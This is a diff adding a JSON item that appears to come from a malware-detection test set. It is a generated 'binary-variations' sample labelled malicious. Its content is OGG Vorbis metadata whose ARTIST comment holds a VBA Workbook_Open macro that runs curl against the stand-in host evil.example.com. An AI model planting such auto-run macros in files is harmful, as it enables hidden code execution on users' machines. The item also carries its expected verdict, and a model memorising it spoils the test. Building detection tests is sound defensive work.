@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::92::binary-variations::3",
+  "base_sample_id": "exp::document-office::92",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -2014534571,
+  "content": "{\n  \"format\": \"ogg\",\n  \"vorbisComment\": {\n    \"vendor\": \"Lavf60.3.100\",\n    \"comments\": [\n      \"ARTIST=Private Sub Workbook_Open()\\n  CreateObject(\\\"WScript.Shell\\\").Run \\\"curl http://evil.example.com/\\\"\\nEnd Sub\\n\",\n      \"ENCODER=libvorbis\"\n    ]\n  }\n}",
+  "content_hash": "21df1ba937ce57bb78cd6eb2476ce2637e289694ab3bcd97b0137edb6b1f1309",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:ogg-comment",
+  "difficulty": "advanced"
+}
